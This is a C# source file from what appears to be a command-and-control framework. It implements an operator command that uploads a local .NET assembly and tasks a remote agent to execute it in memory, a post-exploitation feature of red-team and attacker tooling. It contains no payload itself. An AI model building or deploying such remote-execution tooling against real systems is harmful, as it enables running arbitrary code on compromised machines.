using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Commander.Commands.Agent.Execute_Assembly
{

    public class ExecuteAssemblyCommand : SimpleEndPointCommand
    {
        public override string Description => "Execute a dot net assembly in memory";
        public override string Name => EndPointCommand.EXECUTEASSEMBLY;

        protected override void InnerExecute(CommandContext context)
        {
            var args = context.CommandParameters.GetArgs();
            if(args.Length == 0)
            {
                context.Terminal.WriteLine($"Usage : {this.Name} ExePath [Arguments]");
                return;
            }

            var exePath = args[0];

            if (!File.Exists(exePath))
            {
                context.Terminal.WriteError($"File {exePath} not found");
                return;
            }
            byte[] fileBytes = null;
            using (FileStream fs = File.OpenRead(exePath))
            {
                fileBytes = new byte[fs.Length];
                fs.Read(fileBytes, 0, (int)fs.Length);
            }

            string fileName = Path.GetFileName(exePath);
            bool first = true;
            var fileId = context.CommModule.Upload(fileBytes, Path.GetFileName(fileName), a =>
            {
                context.Terminal.ShowProgress("uploading", a, first);
                first = false;
            }).Result;

            //context.Terminal.WriteLine("Parms = " + context.CommandParameters.ExtractAfterParam(0));

            context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, this.Name, fileId, fileName, context.CommandParameters.ExtractAfterParam(0)).Wait();
            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.Id}.");
        }
    }
}
